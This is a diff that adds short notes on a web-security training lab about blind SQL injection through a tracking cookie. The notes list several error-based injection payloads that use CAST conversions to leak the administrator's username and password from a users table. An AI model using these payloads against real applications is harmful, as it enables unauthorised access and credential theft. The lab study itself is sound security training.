@@ -1,0 +1,27 @@
+This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 
+The results of the SQL query are not returned.
+
+The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, 
+then log in to their account. 
+
+End Goals:
+- Exploit SQLi to retrieve the admin users credentials from the users table
+- Log into their account
+
+Analysis:
+---------
+
+select trackingId from trackingIdTable where trackingId='dslkhdkjshdkj''
+
+select * from tracking where id='dslkhdkjshdkj'--'
+
+CAST()
+
+dslkhdkjshdkj' AND CAST((SELECT 1) as int)--
+
+dslkhdkjshdkj' AND 1=CAST((SELECT username from users) as int)--
+
+(Empty)' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
+
+(Empty)' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
+
